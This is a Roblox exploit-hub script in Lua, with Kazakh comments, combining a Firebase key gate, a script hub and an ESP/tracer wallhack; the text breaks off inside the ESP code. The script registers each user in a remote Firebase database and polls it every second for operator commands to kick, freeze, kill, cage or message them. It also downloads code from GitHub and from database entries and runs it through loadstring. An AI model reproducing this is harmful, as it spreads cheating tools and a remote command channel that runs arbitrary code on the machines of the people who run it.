-- =====================================================================
-- X-V2 // NURLYKHAN FULL HUB
-- Part 1 + Part 2 + Part 3 (Firebase ActiveUsers, Cage, Admin Msg, Greeting Intro,
-- Cyberpunk Key Gate, Player Sensor/ESP) — БӘРІ БІР ФАЙЛҒА БІРІКТІРІЛГЕН.
-- =====================================================================

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local LocalPlayer = Players.LocalPlayer

-- Part 1/2 бар болса сол қолданылады, жоқ болса тест режим
local MY_ROBLOX_USER_ID = MY_ROBLOX_USER_ID or 7103646402
local attachGui = attachGui or function(gui)
    pcall(function() gui.Parent = CoreGui end)
    if not gui.Parent then gui.Parent = LocalPlayer:WaitForChild("PlayerGui") end
end

-- Саусақпен (touch) сенімді тартылатын терезе: handle (мыс. тақырып жолағы) арқылы
-- target терезені жылжытады. Frame.Draggable-ге қарағанда мобильді-де тұрақтырақ.
local function makeDraggable(handle, target)
    handle.Active = true
    local dragging, startInput, startPos = false, nil, nil
    handle.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            startInput = input.Position
            startPos = target.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - startInput
            target.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
        end
    end)
end
local HttpService = game:GetService("HttpService")
local SETTINGS_URL = SETTINGS_URL or "https://play-lag-default-rtdb.firebaseio.com/Settings"
local function validateKeyReal(enteredKey)
    -- Part 1 жоқ болса, сол тексеруді осы жерде өзі жасайды
    if not enteredKey or tostring(enteredKey) == "" then
        return false, "КІЛТ ЕНГІЗІЛМЕДІ"
    end
    local ok, isValid, reason = pcall(function()
        local res = request({ Url = SETTINGS_URL .. "/PasswordData.json", Method = "GET" })
        if not res then return false, "ЖАУАП ЖОҚ (request жұмыс істемейді)" end
        if res.StatusCode ~= 200 then return false, "HTTP " .. tostring(res.StatusCode) .. " (Firebase rules?)" end
        if not res.Body or res.Body == "null" or res.Body == "" then return false, "БАЗАДА КІЛТ ЖОҚ" end
        local d = HttpService:JSONDecode(res.Body)
        if type(d) ~= "table" or not d.Password or tostring(d.Password) == "" then return false, "БАЗАДА КІЛТ ЖОҚ" end
        local exp = tonumber(d.ExpireTime) or 0
        if exp ~= 0 and os.time() >= exp then return false, "КІЛТ МЕРЗІМІ БІТТІ" end
        if tostring(enteredKey) == tostring(d.Password) then return true, "БАЗА КІЛТІ РАСТАЛДЫ" end
        return false, "КІЛТ СӘЙКЕС ЕМЕС"
    end)
    if not ok then return false, "БАЗАҒА ҚОСЫЛУ ҚАТЕСІ: " .. tostring(isValid):sub(1, 40) end
    return isValid, reason
end
local function validateKey(enteredKey)
    return validateKeyReal(enteredKey)
end

-- =====================================================================
-- FIREBASE: ActiveUsers (Part 1 + Part 2 толық функционалы, осы бір файлға біріктірілген)
-- =====================================================================
local DATABASE_URL = "https://play-lag-default-rtdb.firebaseio.com/ActiveUsers"
local HUB_URL = "https://raw.githubusercontent.com/h16536666-dotcom/my-scripts1/da0d12d7c6aea4af33090e215fc340b86588864b/Chilli.lua"

-- ===== SAFE CAGE: admin ойыншыны торға алады/жылжытады/шығарады =====
local cageModel = nil
local function createCage()
    if cageModel then cageModel:Destroy() end
    local char = LocalPlayer.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
    local hrp = char.HumanoidRootPart
    cageModel = Instance.new("Model")
    cageModel.Name = "NurlykhanSafeCage"
    local cPos = hrp.Position
    local parts = {
        {Vector3.new(8, 0.6, 8), Vector3.new(0, -3.5, 0), true},
        {Vector3.new(8, 0.6, 8), Vector3.new(0, 4.5, 0), false},
        {Vector3.new(0.6, 8, 8), Vector3.new(-4, 0.5, 0), false},
        {Vector3.new(0.6, 8, 8), Vector3.new(4, 0.5, 0), false},
        {Vector3.new(8, 8, 0.6), Vector3.new(0, 0.5, -4), false},
        {Vector3.new(8, 8, 0.6), Vector3.new(0, 0.5, 4), false},
    }
    local mainPart = nil
    for i, pInfo in ipairs(parts) do
        local p = Instance.new("Part")
        p.Size = pInfo[1]
        p.CFrame = CFrame.new(cPos + pInfo[2])
        p.Color = Color3.fromRGB(0, 245, 212)
        p.Material = Enum.Material.Neon
        p.Transparency = 0.4
        p.Anchored = true
        p.CanCollide = pInfo[3]
        p.Parent = cageModel
        if i == 1 then mainPart = p end
    end
    cageModel.PrimaryPart = mainPart
    cageModel.Parent = workspace
end
local function moveCage(offsetVector)
    if cageModel and cageModel.PrimaryPart then
        for _, part in ipairs(cageModel:GetChildren()) do
            if part:IsA("BasePart") then part.CFrame = part.CFrame + offsetVector end
        end
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            LocalPlayer.Character.HumanoidRootPart.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame + offsetVector
        end
    end
end
local function destroyCage()
    if cageModel then cageModel:Destroy() cageModel = nil end
end

-- ===== ADMIN МЕССЕДЖІ (жауап жазып, Firebase-ге қайтаруға болады) =====
local function showAdminMessageGui(msgText)
    local oldMsg = CoreGui:FindFirstChild("NurlykhanMsgGui")
    if oldMsg then oldMsg:Destroy() end
    local MsgGui = Instance.new("ScreenGui")
    MsgGui.Name = "NurlykhanMsgGui"
    MsgGui.ResetOnSpawn = false
    MsgGui.DisplayOrder = 999
    attachGui(MsgGui)

    local MsgBoxFrame = Instance.new("Frame")
    MsgBoxFrame.Size = UDim2.new(0, 350, 0, 205)
    MsgBoxFrame.Position = UDim2.new(0.5, -175, 0.2, 0)
    MsgBoxFrame.BackgroundColor3 = Color3.fromRGB(6, 10, 18)
    MsgBoxFrame.BackgroundTransparency = 0.2
    MsgBoxFrame.BorderSizePixel = 0
    MsgBoxFrame.Active = true
    MsgBoxFrame.Draggable = true
    MsgBoxFrame.Parent = MsgGui
    Instance.new("UICorner", MsgBoxFrame).CornerRadius = UDim.new(0, 8)
    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(0, 245, 212)
    stroke.Thickness = 1.8
    stroke.Parent = MsgBoxFrame

    local Title = Instance.new("TextLabel")
    Title.Size = UDim2.new(1, 0, 0, 30)
    Title.BackgroundTransparency = 1
    Title.Text = "[CYBER-LINK // ADMIN MSG]"
    Title.TextColor3 = Color3.fromRGB(0, 245, 212)
    Title.TextSize = 12
    Title.Font = Enum.Font.Code
    Title.Parent = MsgBoxFrame

    local MsgLabel = Instance.new("TextLabel")
    MsgLabel.Size = UDim2.new(0.9, 0, 0, 50)
    MsgLabel.Position = UDim2.new(0.05, 0, 0.18, 0)
    MsgLabel.BackgroundTransparency = 1
    MsgLabel.Text = "> " .. tostring(msgText)
    MsgLabel.TextColor3 = Color3.fromRGB(220, 255, 240)
    MsgLabel.TextSize = 12
    MsgLabel.Font = Enum.Font.Code
    MsgLabel.TextWrapped = true
    MsgLabel.Parent = MsgBoxFrame

    local ReplyInput = Instance.new("TextBox")
    ReplyInput.Size = UDim2.new(0.9, 0, 0, 30)
    ReplyInput.Position = UDim2.new(0.05, 0, 0.48, 0)
    ReplyInput.BackgroundColor3 = Color3.fromRGB(14, 22, 34)
    ReplyInput.BackgroundTransparency = 0.25
    ReplyInput.TextColor3 = Color3.fromRGB(0, 255, 136)
    ReplyInput.PlaceholderText = "Жауап енгізу..."
    ReplyInput.Text = ""
    ReplyInput.TextSize = 11
    ReplyInput.Font = Enum.Font.Code
    ReplyInput.Parent = MsgBoxFrame
    Instance.new("UICorner", ReplyInput).CornerRadius = UDim.new(0, 6)

    local SendReplyBtn = Instance.new("TextButton")
    SendReplyBtn.Size = UDim2.new(0.43, 0, 0, 28)
    SendReplyBtn.Position = UDim2.new(0.05, 0, 0.72, 0)
    SendReplyBtn.BackgroundColor3 = Color3.fromRGB(0, 180, 120)
    SendReplyBtn.TextColor3 = Color3.fromRGB(5, 10, 15)
    SendReplyBtn.Text = "SEND"
    SendReplyBtn.TextSize = 12
    SendReplyBtn.Font = Enum.Font.Code
    SendReplyBtn.Parent = MsgBoxFrame
    Instance.new("UICorner", SendReplyBtn).CornerRadius = UDim.new(0, 6)

    local CloseBtn = Instance.new("TextButton")
    CloseBtn.Size = UDim2.new(0.43, 0, 0, 28)
    CloseBtn.Position = UDim2.new(0.52, 0, 0.72, 0)
    CloseBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 110)
    CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    CloseBtn.Text = "CLOSE"
    CloseBtn.TextSize = 12
    CloseBtn.Font = Enum.Font.Code
    CloseBtn.Parent = MsgBoxFrame
    Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 6)

    SendReplyBtn.MouseButton1Click:Connect(function()
        if ReplyInput.Text ~= "" then
            pcall(function()
                request({
                    Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. "/UserReply.json",
                    Method = "PUT",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = HttpService:JSONEncode(ReplyInput.Text),
                })
            end)
            SendReplyBtn.Text = "SENT!"
            task.wait(1)
            MsgGui:Destroy()
        end
    end)
    CloseBtn.MouseButton1Click:Connect(function() MsgGui:Destroy() end)
end

-- ===== ActiveUsers-ке тіркелу + hub іске қосу =====
local isLaunchingHub = false
local function launchMainScriptOnce()
    if isLaunchingHub or getgenv().NurlykhanHubLoaded == true then return end
    isLaunchingHub = true
    getgenv().NurlykhanHubLoaded = true
    pcall(function()
        local source = game:HttpGet(HUB_URL)
        if source and source ~= "" then
            loadstring(source)()
        end
    end)
end
local function registerActiveUser()
    task.spawn(function()
        pcall(function()
            request({
                Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. ".json",
                Method = "PUT",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({
                    Username = LocalPlayer.Name,
                    Time = os.time(),
                    Kick = false,
                    Freeze = false,
                    Kill = false,
                    CageState = "",
                    CageMove = "",
                    Message = "",
                    UserReply = "",
                    JobId = game.JobId,
                    PlaceId = game.PlaceId,
                }),
            })
        end)
    end)
    -- ЕСКЕРТУ: HUB_URL (GitHub) скрипті енді кіргенде АВТОМАТТЫ қосылмайды.
    -- Ол SCRIPT HUB тізімінде бірінші (пин болған) жол ретінде тұрады — ойыншы өзі басқанда ғана қосылады.
end
local registerUser = registerActiveUser

-- ===== 4 секунд сайын "тірі" екенін білдіреді (Time/Username) =====
task.spawn(function()
    while task.wait(4) do
        pcall(function()
            request({ Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. "/Time.json", Method = "PUT", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(os.time()) })
            request({ Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. "/Username.json", Method = "PUT", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(LocalPlayer.Name) })
        end)
    end
end)

-- ===== admin командаларын 1 секунд сайын тыңдайды: Kick / Freeze / Kill / Cage / Message =====
task.spawn(function()
    while task.wait(1) do
        pcall(function()
            local res = request({ Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. ".json", Method = "GET" })
            if res and res.StatusCode == 200 and res.Body ~= "null" then
                local uData = HttpService:JSONDecode(res.Body)
                if type(uData) == "table" then
                    if uData.CageState == "Create" then
                        request({ Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. "/CageState.json", Method = "PUT", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode("") })
                        createCage()
                    elseif uData.CageState == "Destroy" then
                        request({ Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. "/CageState.json", Method = "PUT", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode("") })
                        destroyCage()
                    elseif uData.CageMove and uData.CageMove ~= "" then
                        local dir = uData.CageMove
                        request({ Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. "/CageMove.json", Method = "PUT", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode("") })
                        if dir == "Up" then moveCage(Vector3.new(0, 4, 0))
                        elseif dir == "Down" then moveCage(Vector3.new(0, -4, 0))
                        elseif dir == "Left" then moveCage(Vector3.new(-4, 0, 0))
                        elseif dir == "Right" then moveCage(Vector3.new(4, 0, 0)) end
                    end
                    if uData.Message and tostring(uData.Message) ~= "" then
                        local msgReceived = tostring(uData.Message)
                        request({ Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. "/Message.json", Method = "PUT", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode("") })
                        showAdminMessageGui(msgReceived)
                    end
                    if uData.Kick == true then LocalPlayer:Kick("Nurlykhan HUB // ACCESS REVOKED BY ADMIN") end
                    if uData.Freeze == true then
                        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then LocalPlayer.Character.HumanoidRootPart.Anchored = true end
                    elseif uData.Freeze == false then
                        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then LocalPlayer.Character.HumanoidRootPart.Anchored = false end
                    end
                    if uData.Kill == true then
                        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then LocalPlayer.Character.Humanoid.Health = 0 end
                        request({ Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. "/Kill.json", Method = "PUT", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(false) })
                    end
                end
            end
        end)
    end
end)


-- =====================================================================
-- SCRIPT HUB: Firebase арқылы басқарылатын қосымша скрипттер тізімі.
-- Әр ойыншы кілт терезесінен өткен соң "SCRIPT HUB" тізімін көреді (атын басса - сол скрипт жүктеліп қосылады).
-- Скрипттерді қосу/өшіру/жаңарту режиміне қою ТЕК бөлек "X-Gemini-admin.lua" арқылы жасалады —
-- ол дәл осы Firebase жолына (Settings/Scripts) жазады, осы терезе соны ғана оқиды.
-- =====================================================================
local SCRIPTS_URL = SETTINGS_URL .. "/Scripts"
local refreshScriptsUI = nil -- buildScriptsWindow() толтырады; admin жаңа скрипт қосқанда тізімді жаңартады

local function fetchScriptList()
    local list = {}
    -- Бірінші жол әрқашан GitHub HUB_URL скрипті: пин болған, Firebase-ге тәуелді емес, өшірілмейді.
    table.insert(list, {
        key = "__main_hub__",
        name = "НЕГІЗГІ HUB (GitHub)",
        game = nil,
        source = nil,
        url = HUB_URL,
        updating = false,
        pinned = true,
    })
    pcall(function()
        local res = request({ Url = SCRIPTS_URL .. ".json", Method = "GET" })
        if res and res.StatusCode == 200 and res.Body and res.Body ~= "null" and res.Body ~= "" then
            local decoded = HttpService:JSONDecode(res.Body)
            if type(decoded) == "table" then
                for key, entry in pairs(decoded) do
                    if type(entry) == "table" and entry.Name and tostring(entry.Name) ~= "" then
                        table.insert(list, {
                            key = key,
                            name = tostring(entry.Name),
                            game = entry.Game and tostring(entry.Game) or nil,
                            source = entry.Source,
                            url = entry.Url,
                            updating = entry.Updating == true,
                        })
                    end
                end
                table.sort(list, function(a, b) return a.name:lower() < b.name:lower() end)
            end
        end
    end)
    return list
end

local function runScriptEntry(entry, statusCb)
    task.spawn(function()
        local ok, err = pcall(function()
            local src
            if entry.url and tostring(entry.url) ~= "" then
                src = game:HttpGet(entry.url)
            else
                src = entry.source
            end
            if not src or src == "" then error("скрипт бос") end
            loadstring(src)()
        end)
        if statusCb then
            if ok then
                statusCb(true, "ІСКЕ ҚОСЫЛДЫ: " .. entry.name)
            else
                statusCb(false, "ҚАТЕ: " .. tostring(err):sub(1, 60))
            end
        end
        if not ok then warn("[ScriptHub] " .. entry.name .. " -> " .. tostring(err)) end
    end)
end

local function addScriptEntry(entry)
    local ok, result = pcall(function()
        local res = request({
            Url = SCRIPTS_URL .. ".json",
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode({
                Name = entry.name,
                Source = entry.source,
                Url = entry.url,
                Added = os.time(),
            }),
        })
        if res and (res.StatusCode == 200 or res.StatusCode == 201) and res.Body then
            local d = HttpService:JSONDecode(res.Body)
            return d and d.name ~= nil
        end
        return false
    end)
    return ok and result
end

local function deleteScriptEntry(key)
    local ok = pcall(function()
        request({ Url = SCRIPTS_URL .. "/" .. key .. ".json", Method = "DELETE" })
    end)
    return ok
end

local function refreshScriptsListUI(container, onPick, isAdmin)
    for _, c in ipairs(container:GetChildren()) do
        if not c:IsA("UIListLayout") then c:Destroy() end
    end
    local list = fetchScriptList()
    if #list == 0 then
        local l = Instance.new("TextLabel")
        l.Size = UDim2.new(1, 0, 0, 24)
        l.BackgroundTransparency = 1
        l.Font = Enum.Font.Code
        l.TextSize = 11
        l.TextColor3 = Color3.fromRGB(150, 150, 150)
        l.Text = "Әзірше скрипт қосылмаған"
        l.Parent = container
        return
    end
    for i, entry in ipairs(list) do
        local row = Instance.new("Frame")
        row.Size = UDim2.new(1, 0, 0, 30)
        row.BackgroundTransparency = 1
        row.LayoutOrder = i
        row.Parent = container

        local showDelete = isAdmin and not entry.pinned
        local b = Instance.new("TextButton")
        b.Size = showDelete and UDim2.new(1, -28, 1, 0) or UDim2.new(1, 0, 1, 0)
        b.BackgroundColor3 = entry.updating and Color3.fromRGB(26, 16, 16) or Color3.fromRGB(10, 16, 26)
        b.TextColor3 = entry.updating and Color3.fromRGB(150, 150, 150) or Color3.fromRGB(0, 245, 212)
        b.Font = Enum.Font.Code
        b.TextSize = 13
        local label = entry.name .. (entry.game and (" [" .. entry.game .. "]") or "")
        b.Text = entry.updating and ("⏳ ЖАҢАРТЫЛУДА: " .. label) or ("▶ " .. label)
        b.AutoButtonColor = false
        b.Active = not entry.updating
        b.Parent = row
        Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
        local bs = Instance.new("UIStroke")
        bs.Color = entry.updating and Color3.fromRGB(255, 150, 0) or Color3.fromRGB(0, 245, 212)
        bs.Thickness = 1
        bs.Transparency = 0.55
        bs.Parent = b
        if not entry.updating then
            b.MouseButton1Click:Connect(function() onPick(entry, b) end)
        end

        if isAdmin and not entry.pinned then
            local del = Instance.new("TextButton")
            del.Size = UDim2.new(0, 24, 1, 0)
            del.Position = UDim2.new(1, -24, 0, 0)
            del.BackgroundColor3 = Color3.fromRGB(255, 0, 110)
            del.TextColor3 = Color3.fromRGB(255, 255, 255)
            del.Font = Enum.Font.Code
            del.TextSize = 12
            del.Text = "✕"
            del.AutoButtonColor = false
            del.Parent = row
            Instance.new("UICorner", del).CornerRadius = UDim.new(0, 6)
            del.MouseButton1Click:Connect(function()
                deleteScriptEntry(entry.key)
                refreshScriptsListUI(container, onPick, isAdmin)
            end)
        end
    end
end

-- ===== ScriptHub терезесі: барлық ойыншыға (кілттен өткен соң) =====
-- ===== SCRIPT HUB терезесі: admin хабарлама терезесімен (showAdminMessageGui) ДӘЛ БІРДЕЙ стиль =====
local function buildScriptsWindow()
    local old = CoreGui:FindFirstChild("NurlykhanScriptHub")
    if old then old:Destroy() end
    local Gui = Instance.new("ScreenGui")
    Gui.Name = "NurlykhanScriptHub"
    Gui.ResetOnSpawn = false
    Gui.DisplayOrder = 999
    attachGui(Gui)

    local isAdmin = (LocalPlayer.UserId == MY_ROBLOX_USER_ID)

    -- admin хабарлама терезесімен бірдей өлшем/түс/позиция (MsgBoxFrame-мен сәйкес)
    local Frame = Instance.new("Frame")
    Frame.Size = UDim2.new(0, 350, 0, 340)
    Frame.Position = UDim2.new(0.5, -175, 0.2, 0)
    Frame.BackgroundColor3 = Color3.fromRGB(8, 12, 20)
    Frame.BackgroundTransparency = 0.2
    Frame.BorderSizePixel = 0
    Frame.Active = true
    Frame.Parent = Gui
    Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 8)
    local fs = Instance.new("UIStroke")
    fs.Color = Color3.fromRGB(0, 240, 255)
    fs.Thickness = 1.8
    fs.Parent = Frame

    -- Жоғарғы жолақ: саусақпен де сенімді тартылады (қосымша, қатар жұмыс істейді)
    local HeaderBar = Instance.new("Frame")
    HeaderBar.Size = UDim2.new(1, 0, 0, 30)
    HeaderBar.Position = UDim2.new(0, 0, 0, 0)
    HeaderBar.BackgroundTransparency = 1
    HeaderBar.Parent = Frame
    makeDraggable(HeaderBar, Frame)

    local Title = Instance.new("TextLabel")
    Title.Size = UDim2.new(1, -40, 0, 30)
    Title.Position = UDim2.new(0, 8, 0, 0)
    Title.BackgroundTransparency = 1
    Title.Text = "[CYBER-LINK // SCRIPT HUB]"
    Title.TextColor3 = Color3.fromRGB(0, 240, 255)
    Title.TextSize = 12
    Title.Font = Enum.Font.Code
    Title.TextXAlignment = Enum.TextXAlignment.Left
    Title.Parent = Frame

    local CloseBtn = Instance.new("TextButton")
    CloseBtn.Size = UDim2.new(0, 24, 0, 24)
    CloseBtn.Position = UDim2.new(1, -30, 0, 4)
    CloseBtn.BackgroundColor3 = Color3.fromRGB(220, 35, 95)
    CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    CloseBtn.Text = "X"
    CloseBtn.TextSize = 12
    CloseBtn.Font = Enum.Font.Code
    CloseBtn.AutoButtonColor = false
    CloseBtn.Parent = Frame
    Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 6)
    CloseBtn.MouseButton1Click:Connect(function() Gui:Destroy() end)

    local StatusL = Instance.new("TextLabel")
    StatusL.Size = UDim2.new(1, -16, 0, 16)
    StatusL.Position = UDim2.new(0, 8, 0, 30)
    StatusL.BackgroundTransparency = 1
    StatusL.Font = Enum.Font.Code
    StatusL.TextSize = 10
    StatusL.TextColor3 = Color3.fromRGB(150, 150, 150)
    StatusL.TextXAlignment = Enum.TextXAlignment.Left
    StatusL.Text = ""
    StatusL.Parent = Frame

    local RefreshBtn = Instance.new("TextButton")
    RefreshBtn.Size = UDim2.new(1, -16, 0, 26)
    RefreshBtn.Position = UDim2.new(0, 8, 0, 48)
    RefreshBtn.BackgroundColor3 = Color3.fromRGB(0, 180, 120)
    RefreshBtn.TextColor3 = Color3.fromRGB(5, 10, 15)
    RefreshBtn.Font = Enum.Font.Code
    RefreshBtn.TextSize = 11
    RefreshBtn.Text = "ЖАҢАРТУ"
    RefreshBtn.AutoButtonColor = false
    RefreshBtn.Parent = Frame
    Instance.new("UICorner", RefreshBtn).CornerRadius = UDim.new(0, 6)

    local Scroll = Instance.new("ScrollingFrame")
    Scroll.Position = UDim2.new(0, 8, 0, 80)
    Scroll.Size = UDim2.new(1, -16, 1, -88)
    Scroll.BackgroundTransparency = 1
    Scroll.BorderSizePixel = 0
    Scroll.ScrollBarThickness = 4
    Scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
    Scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
    Scroll.Parent = Frame
    local lay = Instance.new("UIListLayout")
    lay.Padding = UDim.new(0, 6)
    lay.SortOrder = Enum.SortOrder.LayoutOrder
    lay.Parent = Scroll

    local function onPick(entry, _btn)
        StatusL.Text = "Жүктелуде: " .. entry.name .. "..."
        StatusL.TextColor3 = Color3.fromRGB(0, 245, 212)
        runScriptEntry(entry, function(ok, msg)
            StatusL.Text = msg
            StatusL.TextColor3 = ok and Color3.fromRGB(0, 255, 136) or Color3.fromRGB(255, 80, 110)
        end)
    end

    refreshScriptsListUI(Scroll, onPick, isAdmin)
    RefreshBtn.MouseButton1Click:Connect(function()
        StatusL.Text = ""
        refreshScriptsListUI(Scroll, onPick, isAdmin)
    end)

    refreshScriptsUI = function() refreshScriptsListUI(Scroll, onPick, isAdmin) end
end


-- =====================================================================
-- PLAYER SENSOR (ESP) v2: барлық ойыншыға сызық (tracer), төртбұрыш, бас белгісі, ат
-- Ақ-қара дизайн (түстер өзгермеген). Күдікті қимылдар (FLY / SPEED) эвристика арқылы белгіленеді.
-- Телепорт тексерілмейді — ойында ол қалыпты механизм, читерлік саналмайды.
-- Түстер мен функцияларды SETTINGS терезесінен өзгертуге болады (файлға сақталады).
-- =====================================================================
local sensorStarted = false
local function startPlayerSensor()
    if sensorStarted then return end
    sensorStarted = true

    local WHITE = Color3.fromRGB(255, 255, 255)
    local BLACK = Color3.fromRGB(0, 0, 0)
    local GRAY = Color3.fromRGB(170, 170, 170)
    local DARK = Color3.fromRGB(18, 18, 18)
    local ESP_BLUE = Color3.fromRGB(60, 170, 255)   -- қалыпты ойыншы
    local ESP_YELLOW = Color3.fromRGB(255, 225, 60) -- күдікті ойыншы
    local ESP_GREEN = Color3.fromRGB(80, 255, 140)  -- ең жақын ойыншы сызығы

    local DEFAULT_COLORS = { normal = ESP_BLUE, suspect = ESP_YELLOW, nearest = ESP_GREEN, accent = WHITE }

    -- ===== баптаулар =====
    local Cfg = {
        esp = true, box = true, head = true, names = true, info = true, detect = true,
        tracers = true, nearestHL = true,
        origin = "Bottom", thickness = 2, transparency = 0.25,
        colors = {
            normal = DEFAULT_COLORS.normal, suspect = DEFAULT_COLORS.suspect,
            nearest = DEFAULT_COLORS.nearest, accent = DEFAULT_COLORS.accent,
        },
    }

    local SAVE_FILE = "NurulxonSensor.json"
    local BOOLS = { "esp", "box", "head", "names", "info", "detect", "tracers", "nearestHL" }
    pcall(function()
        if isfile and readfile and isfile(SAVE_FILE) then
            local t = HttpService:JSONDecode(readfile(SAVE_FILE))
            for _, k in ipairs(BOOLS) do
                if type(t[k]) == "boolean" then Cfg[k] = t[k] end
            end
            if t.origin == "Bottom" or t.origin == "Center" or t.origin == "Top" then Cfg.origin = t.origin end
            if type(t.thickness) == "number" then Cfg.thickness = math.clamp(t.thickness, 1, 6) end
            if type(t.transparency) == "number" then Cfg.transparency = math.clamp(t.transparency, 0, 0.9) end
            if type(t.colors) == "table" then
                for k, v in pairs(t.colors) do
                    if Cfg.colors[k] and type(v) == "table" and #v == 3 then
                        Cfg.colors[k] = Color3.fromRGB(v[1], v[2], v[3])
                    end
                end
            end
        end
    end)
    local saveQueued = false
    local function saveCfg()
        if saveQueued then return end
        saveQueued = true
        task.delay(1, function()
            saveQueued = false
            pcall(function()
                if not writefile then return end
                local t = { origin = Cfg.origin, thickness = Cfg.thickness, transparency = Cfg.transparency, colors = {} }
                for _, k in ipairs(BOOLS) do t[k] = Cfg[k] end
                for k, c in pairs(Cfg.colors) do
                    t.colors[k] = { math.floor(c.R * 255 + 0.5), math.floor(c.G * 255 + 0.5), math.floor(c.B * 255 + 0.5) }
                end
                writefile(SAVE_FILE, HttpService:JSONEncode(t))
            end)
        end)
    end

    local function contrast(c)
        return (c.R * 0.299 + c.G * 0.587 + c.B * 0.114) > 0.55 and BLACK or WHITE
    end

    -- ===== UI түсін жаңарту жүйесі =====
    local accentTargets, refreshers = {}, {}
    local function accentize(obj, prop)
        table.insert(accentTargets, { obj, prop })
        obj[prop] = Cfg.colors.accent
    end
    local function refreshAll()
        for _, t in ipairs(accentTargets) do
            if t[1].Parent then t[1][t[2]] = Cfg.colors.accent end
        end
        for _, f in ipairs(refreshers) do pcall(f) end
    end

    -- ===== ескі GUI-ды тазалау =====
    local oldF = CoreGui:FindFirstChild("NurulxonSensorESP")
    if oldF then oldF:Destroy() end
    local Folder = Instance.new("Folder")
    Folder.Name = "NurulxonSensorESP"
    attachGui(Folder)

    local oldH = CoreGui:FindFirstChild("NurulxonSensorHUD")
    if oldH then oldH:Destroy() end
    local Hud = Instance.new("ScreenGui")
    Hud.Name = "NurulxonSensorHUD"
    Hud.ResetOnSpawn = false
    Hud.DisplayOrder = 999
    Hud.IgnoreGuiInset = true
    Hud.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    attachGui(Hud)

    local tracked = {}
    local rayParams = RaycastParams.new()
    rayParams.FilterType = Enum.RaycastFilterType.Exclude

    local function newLabel(parent, pos, size, textSize, color)
        local l = Instance.new("TextLabel")
        l.BackgroundTransparency = 1
        l.Position = pos
        l.Size = size
        l.Font = Enum.Font.Code
        l.TextSize = textSize
        l.TextColor3 = color
        l.TextStrokeTransparency = 0
        l.TextStrokeColor3 = BLACK
        l.Text = ""
        l.Parent = parent
        return l
    end

    local function newBillboard(size, offset)
        local b = Instance.new("BillboardGui")
        b.Size = size
        b.StudsOffset = offset or Vector3.new(0, 0, 0)
        b.AlwaysOnTop = true
        b.LightInfluence = 0
        b.ResetOnSpawn = false
        b.Enabled = false
        b.Parent = Folder
        return b
    end

    local function addPlayer(plr, delayT)
        if plr == LocalPlayer or tracked[plr] then return end
        local d = { flags = {}, airT = 0, speedT = 0, spawnGrace = 0, alive = false }
        tracked[plr] = d

        -- бағыт сызығы (әр ойыншыға жеке)
        d.line = Instance.new("Frame")
        d.line.AnchorPoint = Vector2.new(0.5, 0.5)
        d.line.BorderSizePixel = 0
        d.line.BackgroundColor3 = Cfg.colors.normal
        d.line.Visible = false
        d.line.ZIndex = 2
        d.line.Parent = Hud

        -- төртбұрыш (денеге)
        d.box = newBillboard(UDim2.new(4.4, 0, 6.2, 0))
        local bf = Instance.new("Frame")
        bf.Size = UDim2.new(1, 0, 1, 0)
        bf.BackgroundTransparency = 1
        bf.Parent = d.box
        d.boxStroke = Instance.new("UIStroke")
        d.boxStroke.Color = Cfg.colors.normal
        d.boxStroke.Thickness = 1.4
        d.boxStroke.Transparency = 1
        d.boxStroke.Parent = bf

        -- бас белгісі (дөңгелек + нүкте)
        d.headGui = newBillboard(UDim2.new(1.6, 0, 1.6, 0))
